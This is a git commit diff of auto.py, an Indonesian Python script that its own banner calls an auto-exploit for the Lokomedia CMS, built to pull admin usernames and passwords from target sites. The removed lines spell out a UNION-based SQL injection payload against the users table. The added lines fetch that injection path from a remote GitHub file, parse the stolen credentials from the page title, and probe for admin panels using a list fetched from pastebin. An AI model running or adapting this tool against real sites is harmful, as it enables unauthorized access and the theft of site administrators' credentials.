a16b63d4f274ce1875455e997267b2a3611d8098
Nor Ahmad <48079150+archive-code@users.noreply.github.com>
2019-05-24 23:13:40 +0700

    Update auto.py

--- auto.py
+++ auto.py
@@ -9,37 +9,52 @@ def clear():
     os.system('clear')
 
 clear()
-asci = """  
-
-               _        _       _                       _ 
-    /\        | |      | |     | |                     | |
-   /  \  _   _| |_ ___ | | ___ | | ___ __ ___   ___  __| |
-  / /\ \| | | | __/ _ \| |/ _ \| |/ / '_ ` _ \ / _ \/ _` |
- / ____ \ |_| | || (_) | | (_) |   <| | | | | |  __/ (_| |
-/_/    \_\__,_|\__\___/|_|\___/|_|\_\_| |_| |_|\___|\__,_|
-                                                          
-Tools auto exploit lokomedia untuk mencari user dan password admin untuk tutorialnya silahkan dibuka http://bit.ly/bacatxt
-=====================================================================
-Coded By Nor Ahmad Ft ClownTerror072
-Github = https://github.com/archive-code
-Instagram = @norahm4d
-=====================================================================
-"""
-print (asci)
-print ("Note situs target tanpa http/https hasil yang dimunculkan USERNAME | PASSWORD")
+asci = get("https://raw.githubusercontent.com/archive-code/gapenting/master/1.txt")
+ascii = BeautifulSoup(asci.text, 'html.parser')
+print (ascii)
+l1 = get("https://raw.githubusercontent.com/archive-code/gapenting/master/2.txt")
+l2 = BeautifulSoup(l1.text, 'html.parser')
+print (l2)
 uDOMEN = input('Masukkan Domain Target: ')
-# uDOMEN = "smkmuhiku.sch.id"
-url = get("http://"+uDOMEN+"/statis-1'union+select+make_set(6,@:=0x0a,(select(1)from(users)where@:=make_set(511,@,0x3C6C693E,username,password)),@)--+-profil.html")
-
-soup = BeautifulSoup(url.text, 'html.parser')
+p1 = get("https://raw.githubusercontent.com/archive-code/gapenting/master/3.txt")
+p2 = BeautifulSoup(p1.text, 'html.parser')
+p3 = p2.text
+urla = get("http://"+uDOMEN+p3)
+soup = BeautifulSoup(urla.text, 'html.parser')
 hasil = soup.find('title')
-# hasil2 = soup.find('li')
 try:
   res = hasil.text.rstrip().lstrip()
-  # res2 = hasil2.text.rstrip().lstrip()
   print("RESULT = ")
   ress = res.replace(",,", "\n")
   print(ress.replace(",","|"))
 except:
-  print('Situs Not Vuln Pak :"(')
+  print('Situs Not Vuln Pak :(')
   exit
+
+print ("""
+==============================================================
+ADMIN FINDER
+LIST DIBAWAH JIKA TIDAK MAUNAMBAH DI ENTER LANGSUNGAJA
+""")
+urls = uDOMEN                  
+if 'http' not in urls:
+    urls = 'http://'+urls
+listadmin = input("Masukkan list tambahan:")
+print ("==============================================================")
+listone1 = get("https://pastebin.com/raw/Vkqv0FJy") 
+listone2 = BeautifulSoup(listone1.text, 'html.parser')
+listone = listone2.text
+adminList = [listone,listadmin]
+for admin in adminList:
+    try:
+        urli = urls+'/'+admin
+        urlr = get(urli)
+
+    except:                                                   
+         print("gk ad url")                                         
+         exit()
+    if urlr.status_code == 200:
+        print(admin)
+        print(urli)
+    else:
+        print('tidak ada |',urli)
